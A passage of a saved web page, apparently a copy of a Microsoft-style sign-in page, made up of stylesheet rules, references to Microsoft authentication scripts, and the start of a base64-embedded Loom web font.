        .textarea-placeholder {
            position: relative
        }

        select {
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            padding: 6px 0
        }

        select:hover {
            background: transparent
        }

        select:focus {
            background: #eee
        }

        .text-title {
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
            padding: 0;
            margin-top: 16px;
            margin-bottom: 12px;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
        }

        .text-title:lang(zh-cn),
        .text-title:lang(zh-tw) {
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
        }

        .title {
            margin-bottom: 20px;
            margin-top: 20px;
            margin-bottom: 1.25rem;
            margin-top: 1.25rem;
            font-size: 24px;
            line-height: 28px;
            font-weight: 300;
            line-height: 1.75rem;
            padding-bottom: 2.3632px;
            padding-top: 2.3632px;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
            padding: 0;
            margin-top: 16px;
            margin-bottom: 12px;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
        }

        .app-name {
            margin-bottom: 20px;
            margin-top: 20px;
            margin-bottom: 1.25rem;
            margin-top: 1.25rem;
            font-size: 24px;
            line-height: 28px;
            font-weight: 300;
            line-height: 1.75rem;
            padding-bottom: 2.3632px;
            padding-top: 2.3632px;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
            padding: 0;
            margin-top: 16px;
            margin-bottom: 12px;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
            margin-top: 0;
            margin-bottom: 0;
            font-size: .9375rem;
            line-height: 1.25rem
        }

        .secondary-text {
            font-size: .85rem
        }

        .alert {
            margin-bottom: 0;
            margin-top: 0
        }

        .alert.alert-margin-bottom {
            margin-bottom: 12px
        }

        .error {
            color: #e81123
        }

        .text-base {
            font-size: .85rem
        }

        .dropdown-toggle.membernamePrefillSelect {
            padding: 0;
            border-width: 1px;
            height: 36px;
            outline: none;
            border-left: none;
            border-right: none;
            border-top: none;
            border-color: #666;
            background-color: transparent
        }

        .dropdown-toggle.membernamePrefillSelect:active {
            transform: none;
            border: 1px solid #0078d7;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0
        }

        .dropdown-toggle.membernamePrefillSelect:focus {
            transform: none;
            border: 1px solid #0078d7;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            background-color: #eee !important
        }

        .dropdown-toggle.membernamePrefillSelect:hover,
        .open .dropdown-toggle.membernamePrefillSelect {
            border: 1px solid #0078d7;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            background-color: #eee !important
        }

        .dropdown-toggle.membernamePrefillSelect.has-error,
        .dropdown-toggle.membernamePrefillSelect.has-error:hover {
            border-width: 1px;
            border-color: #e81123
        }

        .outlookEmailLabel {
            border-left: none;
            border-right: none;
            border-top: none;
            padding-right: 0
        }

        .subtitle {
            font-size: .8125rem;
            font-weight: 400;
            line-height: 20px
        }

        .section {
            margin-bottom: 0
        }

        .radio {
            margin-top: 20px;
            margin-bottom: 20px
        }

        div[role=radiogroup]>div[class="radio"]:first-child {
            margin-top: 0
        }

        .form-group-top {
            margin-top: 16px
        }

        div[role=listitem],
        .list-item {
            margin-left: 20px;
            display: list-item;
            list-style: circle;
            list-style-type: disc
        }

        .phoneCountryCode {
            position: absolute;
            width: 100%;
            left: 0;
            padding: 6px 4px;
            height: 36px;
            border-bottom-width: 1px;
            border-color: #666;
            border-color: rgba(0, 0, 0, 0.6);
            border-bottom-style: solid
        }

        .phoneCountryCode.hasFocus {
            background-color: #eee;
            border: 1px solid #eee;
            border-bottom-color: #0067b8;
            margin: -1px -1px 0 -1px
        }

        .phoneCountryCode.has-error {
            border-color: #e81123
        }

        .phoneCountry {
            left: 0;
            opacity: 0;
            cursor: pointer;
            -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"
        }

        .phoneCountryBox {
            display: inline-block
        }

        .downArrow {
            position: absolute;
            right: -6px;
            padding: 6px 0;
            height: 36px
        }

        .phoneNumber {
            display: inline-block;
            padding-left: 16px
        }

        .row-app-info {
            table-layout: auto
        }

        .row-app-info .logo {
            display: table-cell;
            width: 32px;
            height: 32px;
            padding-right: 8px
        }

        .row-app-info .logo img {
            width: inherit;
            height: inherit
        }

        .pagination-view {
            position: relative;
            min-height: 206px
        }

        .pagination-view.has-identity-banner {
            min-height: 170px
        }

        .zero-opacity {
            opacity: 0
        }

        .lightbox-cover {
            background-color: white;
            opacity: 0;
            filter: alpha(opacity=0);
            z-index: -1;
            height: 100%;
            width: 100%;
            position: absolute;
            top: 0;
            left: 0;
            transition: all .5s ease-in;
            -o-transition: all .5s ease-in;
            -moz-transition: all .5s ease-in;
            -webkit-transition: all .5s ease-in
        }

        .lightbox-cover.disable-lightbox {
            z-index: 10;
            opacity: .5;
            filter: alpha(opacity=0)
        }

        .ordered-list {
            padding-left: 15px
        }

        .checkmark-badge {
            position: relative;
            bottom: 1px;
            height: 15px;
            width: 15px
        }

        .richtext-warning {
            margin-top: 20px;
            margin-bottom: 10px
        }

        .richtext-description {
            margin-top: 10px;
            margin-bottom: 10px
        }

        @media (-ms-high-contrast) {

            .btn,
            button,
            input[type='button'],
            input[type='submit'],
            input[type='reset'],
            .btn.btn-google {
                -ms-high-contrast-adjust: none;
                outline: 1px solid windowText;
                border: 1px solid window;
                background-color: window;
                color: windowText;
                text-decoration: none
            }

            .btn:hover,
            button:hover,
            input[type='button']:hover,
            input[type='submit']:hover,
            input[type='reset']:hover,
            .btn.btn-google:hover {
                outline: 1px solid windowText;
                border: 1px solid highlight;
                background-color: highlight;
                color: highlightText;
                text-decoration: none
            }

            .btn:hover:focus,
            button:hover:focus,
            input[type='button']:hover:focus,
            input[type='submit']:hover:focus,
            input[type='reset']:hover:focus,
            .btn.btn-google:hover:focus {
                outline: 1px solid windowText;
                border: 1px solid windowText;
                background-color: highlight;
                color: highlightText;
                text-decoration: underline
            }

            .btn:focus,
            button:focus,
            input[type='button']:focus,
            input[type='submit']:focus,
            input[type='reset']:focus,
            .btn.btn-google:focus {
                outline: 1px solid windowText;
                border: 1px solid windowText;
                background-color: window;
                color: windowText;
                text-decoration: underline
            }

            .btn.btn-primary,
            button.btn-primary,
            input[type='button'].btn-primary,
            input[type='submit'].btn-primary,
            input[type='reset'].btn-primary,
            .btn.btn-google.btn-primary {
                outline: 1px solid highlight;
                border: 1px solid highlight;
                background-color: highlight;
                color: highlightText;
                text-decoration: none
            }

            .btn.btn-primary:hover,
            button.btn-primary:hover,
            input[type='button'].btn-primary:hover,
            input[type='submit'].btn-primary:hover,
            input[type='reset'].btn-primary:hover,
            .btn.btn-google.btn-primary:hover {
                outline: 1px solid highlight;
                border: 1px solid window;
                background-color: window;
                color: highlight;
                text-decoration: none
            }

            .btn.btn-primary:hover:focus,
            button.btn-primary:hover:focus,
            input[type='button'].btn-primary:hover:focus,
            input[type='submit'].btn-primary:hover:focus,
            input[type='reset'].btn-primary:hover:focus,
            .btn.btn-google.btn-primary:hover:focus {
                outline: 1px solid windowText;
                border: 1px solid window;
                background-color: window;
                color: highlight;
                text-decoration: underline
            }

            .btn.btn-primary:focus,
            button.btn-primary:focus,
            input[type='button'].btn-primary:focus,
            input[type='submit'].btn-primary:focus,
            input[type='reset'].btn-primary:focus,
            .btn.btn-google.btn-primary:focus {
                outline: 1px solid windowText;
                border: 1px solid window;
                background-color: highlight;
                color: highlightText;
                text-decoration: underline
            }

            .backButton {
                outline: none;
                border: 1px solid window;
                background-color: window;
                color: windowText
            }

            .backButton:hover {
                outline: none;
                border: 1px solid highlight;
                background-color: window;
                color: windowText
            }

            .backButton:hover:focus {
                outline: none;
                border: 1px solid highlight;
                background-color: window;
                color: windowText
            }

            .backButton:focus,
            .backButton:active {
                outline: none;
                border: 1px dashed highlight;
                background-color: window;
                color: windowText
            }
        }

        .template-header-container {
            position: absolute;
            width: 100%;
            z-index: 1000
        }

        .template-header {
            width: 100%;
            height: 48px;
            display: block;
            padding: 12px 24px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2)
        }

        .template-header-img {
            max-height: 24px;
            max-width: 150px
        }

        .template-footer {
            height: 28px;
            display: block
        }

        .template-footer #footerLinks {
            margin-top: auto;
            margin-bottom: auto;
            margin-left: auto;
            margin-right: 0
        }

        .debug-details-banner.table {
            padding: 28px
        }

        .debug-details-header {
            padding: 16px 0
        }

        .debug-details-banner.table #errorBannerCloseLink {
            position: absolute;
            right: 28px
        }

        .vertical-split-container {
            display: table;
            height: 100%;
            background-color: white;
            overflow-y: auto
        }

        .vertical-split-container.has-header {
            height: calc(100% - 48px);
            margin-top: 48px
        }

        .vertical-split-container.has-header.has-footer {
            height: calc(100% - 48px - 28px)
        }

        .vertical-split-container .boilerplate-text {
            background-color: transparent
        }

        .vertical-lightbox-container {
            overflow-y: auto;
            width: 500px;
            background-color: white;
            position: relative
        }

        .vertical-split-content {
            box-shadow: none;
            padding: 44px 44px 0 44px;
            margin-bottom: 0
        }

        .vertical-split-content-margin-top {
            margin-top: 54px
        }

        .vertical-split-background-image-container {
            display: block;
            width: 100%;
            height: 100%
        }

        .vertical-split-background-image {
            width: 100%;
            height: 100%;
            background-position: center;
            background-size: cover
        }

        .no-margin-bottom {
            margin-bottom: 0
        }

        @media screen and (max-width:599px) {
            .has-header {
                padding-top: calc(5% + 48px)
            }

            .vertical-split-background-image-container {
                display: none
            }

            .vertical-split-container {
                margin-left: auto;
                margin-right: auto
            }

            .vertical-split-container.has-header {
                margin-top: 0
            }

            .vertical-split-content {
                padding: 24px
            }

            .footer.default {
                background-color: #fff !important;
                position: fixed;
                bottom: 0
            }

            .footerNode a {
                color: #747474 !important
            }
        }

        @media screen and (min-width:600px) {
            .vertical-split-background-image-container {
                display: block
            }

            .template-content-align-left {
                margin-right: auto;
                margin-left: 0
            }

            .template-content-align-right {
                margin-left: auto;
                margin-right: 0
            }

            .template-content-align-center {
                margin-left: auto;
                margin-right: auto
            }

            .template-content-align-middle {
                margin-top: auto;
                margin-bottom: auto
            }

            .template-content-align-top {
                margin-bottom: auto;
                margin-top: 0
            }

            .template-content-align-bottom {
                margin-top: auto;
                margin-bottom: 0
            }

            .template-content-padding-top {
                padding-top: 5%
            }

            .template-content-padding-top.has-header {
                padding-top: calc(5% + 48px)
            }

            .template-content-padding-bottom {
                padding-bottom: calc(5% + 28px)
            }

            .template-content-padding-left {
                padding-left: 10%
            }

            .template-content-padding-right {
                padding-right: 10%
            }

            .vertical-split-content {
                width: 500px;
                min-width: 500px
            }

            .vertical-split-content .boilerplate-text {
                margin: 76px -44px 0 -44px
            }
        }

        .lightbox-bottom-margin-debug,
        .login-content-margin-bottom {
            margin-bottom: 28px
        }

        .cc-banner {
            position: relative;
            font-size: 12px;
            display: table-row;
            height: 2em
        }

        .cc-banner div,
        .cc-banner span,
        .cc-banner a,
        .cc-banner svg {
            margin: 0;
            padding: 0;
            text-decoration: none
        }

        .cc-banner .cc-v-center {
            display: inline;
            vertical-align: middle;
            line-height: 2em
        }

        .cc-text>a {
            float: right
        }

        .cc-banner {
            color: #231f20;
            background: #f2f2f2;
            text-align: center;
            padding: 0 1em;
            margin: 0
        }

        .cc-banner>.cc-container {
            text-align: left;
            padding: .75em;
            display: inline-block;
            width: 100%
        }

        @media (min-width:768px) {
            .cc-banner {
                font-size: 13px
            }
        }

        @media (min-width:1084px) {
            .cc-banner {
                padding: 0
            }

            .cc-banner>.cc-container {
                width: 90%;
                max-width: 1600px
            }
        }

        .cc-banner.active {
            display: block
        }

        .cc-banner .cc-icon {
            height: 1.846em;
            width: 1.846em
        }

        .cc-banner .cc-text {
            margin-left: .5em;
            margin-right: 1.5em
        }

        .cc-banner .cc-link {
            color: #0067b8
        }

        .cc-banner .cc-link:hover,
        .cc-banner .cc-link:focus {
            text-decoration: underline
        }

        .cc-banner .cc-link:focus {
            outline: 0;
            background: #dae6ef;
            background: content-box rgba(0, 120, 215, 0.1)
        }

        .env-banner {
            display: table;
            max-width: 200px;
            min-height: 50px;
            max-height: 100px;
            overflow: hidden;
            background: #0067b8;
            color: #fff;
            position: absolute;
            margin: 10px;
            font-weight: bold;
            top: 0;
            right: 0;
            z-index: 100
        }

        .env-banner-inner {
            display: table-cell;
            vertical-align: middle;
            padding: 5px;
            text-align: left;
            direction: ltr
        }

        body a.env-banner-link {
            text-decoration: underline
        }

        .env-banner-link:hover,
        .env-banner-link:link,
        .env-banner-link:visited,
        .env-banner-link:visited:hover,
        .env-banner-link:link:hover,
        .env-banner-link:active,
        .env-banner-link:link:active,
        .env-banner-link:visited:active {
            color: #fff
        }

        .env-banner-text {
            display: inline-block;
            font-weight: normal
        }

        .fade-in-lightbox {
            animation: fadeIn .3s ease-in;
            -webkit-animation: fadeIn .3s ease-in;
            -moz-animation: fadeIn .3s ease-in;
            -ms-animation: fadeIn .3s ease-in;
            -o-animation: fadeIn .3s ease-in
        }

        .animate {
            animation-duration: .25s;
            -webkit-animation-duration: .25s;
            -moz-animation-duration: .25s;
            -ms-animation-duration: .25s;
            -o-animation-duration: .25s;
            animation-timing-function: cubic-bezier(.5, 0, .5, 1);
            -webkit-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
            -moz-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
            -ms-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
            -o-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
            animation-fill-mode: both;
            -webkit-animation-fill-mode: both;
            -moz-animation-fill-mode: both;
            -ms-animation-fill-mode: both;
            -o-animation-fill-mode: both;
            transition-property: left;
            -webkit-transition-property: left;
            -moz-transition-property: left;
            -ms-transition-property: left;
            -o-transition-property: left
        }

        html[dir=ltr] .animate.slide-out-next,
        html[dir=rtl] .animate.slide-out-back {
            animation-name: hide-to-left;
            -webkit-animation-name: hide-to-left;
            -moz-animation-name: hide-to-left;
            -ms-animation-name: hide-to-left;
            -o-animation-name: hide-to-left
        }

        html[dir=ltr] .animate.slide-in-next,
        html[dir=rtl] .animate.slide-in-back {
            animation-name: show-from-right;
            -webkit-animation-name: show-from-right;
            -moz-animation-name: show-from-right;
            -ms-animation-name: show-from-right;
            -o-animation-name: show-from-right
        }

        html[dir=ltr] .animate.slide-out-back,
        html[dir=rtl] .animate.slide-out-next {
            animation-name: hide-to-right;
            -webkit-animation-name: hide-to-right;
            -moz-animation-name: hide-to-right;
            -ms-animation-name: hide-to-right;
            -o-animation-name: hide-to-right
        }

        html[dir=ltr] .animate.slide-in-back,
        html[dir=rtl] .animate.slide-in-next {
            animation-name: show-from-left;
            -webkit-animation-name: show-from-left;
            -moz-animation-name: show-from-left;
            -ms-animation-name: show-from-left;
            -o-animation-name: show-from-left
        }

        @keyframes hide-to-left {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: -200px;
                opacity: 0
            }
        }

        @keyframes show-from-right {
            from {
                left: 200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @keyframes hide-to-right {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: 200px;
                opacity: 0
            }
        }

        @keyframes show-from-left {
            from {
                left: -200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-webkit-keyframes hide-to-left {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: -200px;
                opacity: 0
            }
        }

        @-webkit-keyframes show-from-right {
            from {
                left: 200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-webkit-keyframes hide-to-right {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: 200px;
                opacity: 0
            }
        }

        @-webkit-keyframes show-from-left {
            from {
                left: -200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-moz-keyframes hide-to-left {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: -200px;
                opacity: 0
            }
        }

        @-moz-keyframes show-from-right {
            from {
                left: 200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-moz-keyframes hide-to-right {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: 200px;
                opacity: 0
            }
        }

        @-moz-keyframes show-from-left {
            from {
                left: -200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-ms-keyframes hide-to-left {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: -200px;
                opacity: 0
            }
        }

        @-ms-keyframes show-from-right {
            from {
                left: 200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-ms-keyframes hide-to-right {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: 200px;
                opacity: 0
            }
        }

        @-ms-keyframes show-from-left {
            from {
                left: -200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-o-keyframes hide-to-left {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: -200px;
                opacity: 0
            }
        }

        @-o-keyframes show-from-right {
            from {
                left: 200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

        @-o-keyframes hide-to-right {
            from {
                left: 0;
                opacity: 1
            }

            to {
                left: 200px;
                opacity: 0
            }
        }

        @-o-keyframes show-from-left {
            from {
                left: -200px;
                opacity: 0
            }

            to {
                left: 0;
                opacity: 1
            }
        }

    </style>



    <script crossorigin="anonymous" data-savepage-src="https://aadcdn.msftauth.net/shared/1.0/content/js/OldConvergedLogin_PCore_Y3yOAVBGo2j5aFYrAwBmHw2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    <script crossorigin="anonymous" data-savepage-src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_dvvcidi7adxn_soxvlb4_w2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-lxKtI01bRbETdKJ0IBqyAL6DgRZUHoOXyrPet9bspCibcV9wyR54AUdKiUZSZ8Jm"></script>




    <style type="text/css">
        @font-face {
            font-weight: 400;
            font-style: normal;
            font-family: 'Circular-Loom';

            src:
                /*savepage-url=https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Book-cd7d2bcec649b1243839a15d5eb8f0a3.woff2*/
                url(data:font/woff2;base64,d09GMgABAAAAAQ2iABIAAAADjSgAAQtkAAMAAAABC8wAAAHWAAAEnwAAAAAAAAAAG4HNfBylaBSFdwZgAIkKCF4JgnMREAqJoHyIxhMSgfk4ATYCJAOXTAuXUAAEIAWMCge1AQyEcVuyUrMF/jXk3m9uvabMsHEJTQzB1uExlDwotcWuiAPGdgFRrdI5tu4BUNSMCtxgbqbQKn63DcjgI5H37pb9////////////3uVL+JvJu+uS3PVLW0r5KqVTCiIK6pwbiZqQhGAGYkpKxjSQkaVZXmQxzUuqYpnOMs2jSN1EasM8C0wkY0pl57RIXt/DZU0r4VoFq3RNMW5AYaRg20QDFkiB0g5uNg8Cusf9YMuhDblzIVAEChZ8oMU4/n4qynQDmn0wntNzFwId2RQCjSd2DoFPTJW1PIBheLnQqnutyco5tS/tdZM5t09wj/cOBtO33aVu2bvW1PK1hyU4VgZFaKKpr+IturXCMl6umPruBQq9gciap7HgGT9yYQOdmQJjAu70qrTLuBmY055q1NQfn+jMlS9VPY2/pgZUfFt6VX/ieEhmDWZO70nJfaxpC8YbfMAzg+JNaXKo+CNM75QmKMLTO+/Z7gBTj0ePBb6dwNOXWQ90LwEukeLMzwvSc+Fm7pdkPHgooVzYpSwKS8HpT+4Uqd2q2yJ5C7wkRSpQvu/IPB6ROAx3H4eEfFAjf7lg/RGkNAgQrsLkn4h46th6TWcxKOJ8FU9Ku7uxb8n7sOonfrqFwNbUC/2jmu/UIQITnDnnpVApQgWNKdCC50y1QAGrx+5OIuISE3hwFk8RRG//nS1586pEKQ4OqYP6npqIIgtAKCKRGe94wOZr1nVIVdCnJG7QPTK6opnEpGkckYSArmo4JuUnP9AjfdE0p9WCKzZn8fDsKd68Xj13tK4cGngTSchzAB23noMgCJEI0dzJESZrJ4U4CCN04yv7558H//7/HXPt+/b9olpYAdlBdUpJXfK7QKV8fspp75sZjSyNkCyyLMsyh9BeTpb/5/QTpsCbAn0APhUAtuVje+r2iHDrCfAHPO1fUg2HTO41JdM1meuxnfC7uw9xkPpBDQd4UHvmAM0tRAQU6VXcrdkYGxvbGDBYM1bNghi0hJLKK2EBJla/URiIb2D/K6hvJe8ryqv/+r7RvLX5z+v9UXijG2iY1EqVFMAtn3YzhbHtrql2QVOffbfCJ/NeRSPmtkesERKhdKKYJ1EPFT/RBnEO/D/9ktp59/cMIWVhEHYlUXhkKg9WYLE22u3pX6f1VCpNdEuOLJeI5iVyPMGFFHmLySJvBlLsDcp4xBUzQVfEFduBjEe6ghNri7iCE5PLiSuQmC1c/y3td/frfvfrSv+sBRBARFxs714kwAxDKIkpwGbSOJCX7KDUieB1ulmelQ0UDQzhAsqaDFzL5LGMcA14lf1ZNuAX29DN+jEnWODRXYX+ZIHcAIvkuTHmfnMvsDAoWcgPFGHW+BLmaMga8zpl69wn4Sb0XeZMIANfroibxKCVLK/s1h6KfYh9Mv6/nUKrrRLzt0BkFpJXNL2iDO6BR5w4tsGbSIElmnBgi3nnnQJARVKtqcUFcEg3nB9o4eUPaCQ8kRIA7opb48KHcBGiqs3q945YxLEcRDQtKgASIEBgeF36etm67B2mdu06EjgfOegQuskZcqb4CHQs6UlPD0RPj0/SpRTq/VWUalyhZb64t+XlN7MjvSlPuENpJNs5tEILDpmrrjRdUAIISWYmAVJR6Xq9/A/OWRQl6h4ABwhZkrbZ0qQLlA7Yn5Bv5AtJ8o17/hnu9f8QAgQCRESvSW1bXyf6VVGFWyPEV/3mXCMsuz06NTpfEFo9JmktzGkPTQT2rKkrywFUwEV60auHl2raLkhKM7vA0aF2+1VuP09vZ4DgEdJRJ57Ek+mQ7z8TLdk6pvDV+xCn1kEsOiCR7UC3h/nXrVoxwaOYxPAlYj8B3927i0IofFLwZvrimhqb8Z/9Vv/7VRY6CidA2sCYvfd1hMB82/rOEvuuidULycSjlsqGjq/JR31gXRkGwv9lm2SSv0crqi61CIWwPIREuKbNCYmQKEBbE94I/0bM6EpzSxcOhipcM4OT6CfktNdc7A/VHgNwGHsZpkqjHb8iufX4KpwAAf/QGorTNEQhb+EsLkEVTo8R50t1izit4yZssc3BdntEG2KzAveR1LlTnRXPMaS47DSMD7y9uleGq+PAOXKdwv/W1PSTm+R0yRDkKQFIoybavolDfn2zxD4c9xqGAUPQwEFqCPyPA81AS91VpMNC4QsOyPJCUbubx881sDCR5Sm6hz2wNuFgwBJOTuB/pxIbilbw8tqamqJtNUsQVL7csKGlh3+ee8f/fFx1my/gNnDmAY9F0wL/ANKcOCZwJw0DljhwasimWTsrHch3ATmAUHTngMP2A2K3mll5UavVyiDt2hxfTpbyp1h35uS1ku6yWhlWklkXZF8IZTug8z0YnpFrxDLffflV/WUAuy+/rL4tH57/XyuzfVP5UwHqzJlTkamcUyEQjknFx4gUzFRev/wAV/+gS08FFqiWMOgWyImGBQC1Z3XUyDVmlVwhAY2OtWuc2//fVy3bez8A6QEEMf8BFAVCGwDN7BriJmrp7TlzjmU6xTp2IVX/3fdA4L0HUMAHiCEAjpZhRkcEtWsS2EBSO8ef4AxJyXu4dM4qHXIlURskOkl0CLGoXK1dbelyXHStW/P898v+ld5VX12lgR+wf+BjuoApQ9wTFHa1UhplG+k6j3M7hMAigCLA7TzwlZFK0AQx/zmtl+6Tdl9K3XMKCuI+n29veNrwABh0lrzKrVf+vbFUAHPys+R2Ja3zEBoMg5FLypZgFGTCebPCG8D9zylKJT39jOUhZ7XIrIOwIsNPcAFqTnKW9OPufbwbjqUWGfqKArsQnRDmZOfR5nMopG2S/g22Tmpc5/9nmvW5uPESD91fR0eC/Lu6FlzRO+MYYDV72uVoyy1EvESeRGREzpD1BQkmaoXisNnzpUBmANVQ7BGqyO6vPGlYawp3DdP/SnkrJA/1w5zNu7ITm4mQUTGuYwnOhduUVjzuJLIv/VNUV5bBCIRUyDgM3PtO9g+hWjACI1EW48jdvZcm9/M61lJs1bFT2K7gHPZ0b3r2TUorFg3YLnFErrVCe+nd/g9Y8MCi1TAEAYlJqSAeZMjNOzCGafDvTPzP54qXwJ9mEUQRxRgjhPBiOb4b9v/9o/x2lgp9a7mUTgkiEiRIkCCZfVcXWiXZ+9LKlbCEMAxmEEYYYcySrzz/82W+c1/AkSLEYkH7tQ0C//1eNe4bccBdHgJJx0VS0rd9rh/+2r+eGbppl0l33u69sX08gkTJGJCAEXnbf7sNZ5fMjOpMgGoQ2/4txvS/zOLDFE1hNCxBLPWX0u4GcVPCHNlFOVSwalKnpDGB22FOa6c9gme1wAUnNcSxZZJBssAzgtT/9zdrLoyGpKzWIEDrQazt4Csff5bmnbnGzMbPfe1cqYlGFHQpfVd0WWp1zFwrz+Xa1GSqnbhibARINMFuApDNwzar6d7L3pszr0AVsaATSGAEXlbALl5IIODLrtBaAyKe/nBdVQAGHbAhB+yki3nxPQogQP1EYgUCEp6YrUCA5XqDFghw3GLQAQGlt5k1QMBDAjbkIOJnYYyFCSnMkcOUEuapn6hBo/80sXZigC/l0dOKaqoCSuMECCSAQY2daa/ZEf4zxFAUgzwBx8XDJyAkIiYhJSOnoKSipqGlQ9CLZ1B3kkqoAiEYQTGcICmaYTleECVZUTXDtGzH9c6YcqlFueeBR5545oXv/ehnv/rdn/72r/+1e+m1t977SMNIDM4v4AkNCkfHROGkcFITANFahhP0LgaTxebujXfe++izr9Ky8orKqkbGZhYghLh2lw44k1WcxWrWEAAwQXt6QpLqyoDwJwIAOmgULoVjcymcs51u19q7Cxez1kKNCcKmSak0y0o5KYPyTpN4s9ZpnTbrzHVf5+Slbq+Zuq+vnq2zdaTL8y4z4yutzuu9Or+C+G/7htpkCAMRPdV4os6z6fatXI5jn1xV6+937A/KgnHlPqIsmAv2K/0VP0hDmxZ1zf4g6E9m46xZo570yf7ORyKQYqTz5lpxPCWKCMsl6tf9p8qamZduBNRaiEKJ3S6hIAqxQIWrCX6nJ+LSOGnBcK3PT0agVVyLTzmeVsVYIbIkWQQE8/MTf9ZR75crK9W3dSk/rd3tHbifHTWz1t9VX339sI7SOhc06Qf6jf5hxFA0SDr6a0fDmDeuvNWXme5IrJT/m2qDi7WCjBvU+f0KNqhaQewdwC8PheuqfdmptaLM+jVR1R7HqDZdP6CFMRFtNp6YNeMqXich1vkVdgz5YRuSi31VXPAiTTXOVjrMta/vjvnG4t4sjGS0XFapVeXecUf6Wab1l/XMhkF22CRIjr3UPv1zn7c3GW70abHUbyDnB6uBXNmO0rr+7x3n7r//5/91itk6dYYUOXPjU5du+1p6yhko75E48VBZGauqSmNz6cabZoiZmozWKuaoM9eq7HnWWGu+9Sy0jUV2zVtsnwASee2wPsffg016yGZimF5AIvw30Wy/TVdshjEPn7figMqbFL36kc2psclxa4LXL5DdgRpEdY+8BxT9nfGMQEppZogSy5CTlE9hd+9ipRWZoLJS1agJGntUYZrmKrUOtbZInVinfPf0lyH97ZH+8dfQfwkNlOPkQ5HH93Y6MUKAdagFYrwkLmX4hD+kmOgKYoBURM2lRem5zIhiwgw61NyKhLN6CymSAv/r5g3KJ8YBHFqeQxfUxFvgS8FasWHlgQpeRlMaKTZAkvAfTaq/DqJXKJ8MEPXsBVIxOclovi8Gwf4gxqgNaOX0EDMDlQr1lxRJETqQXqkdGu2i+8xkusQRQIArw6C98G3wHvJgNmDi9jG2lbuTronBgXTaM6FEdbGoQqFwiCSwpbmRBhkpCfn+rBZjNEZ1vFKx+ubNBVgJtj7YabfYllAtalN8P6Gt2LbaziXdqVdT5574gbRLCIaEhBzWiSGBfDBbIiEgAFgj+xBUu7KMUtlVebeaPN7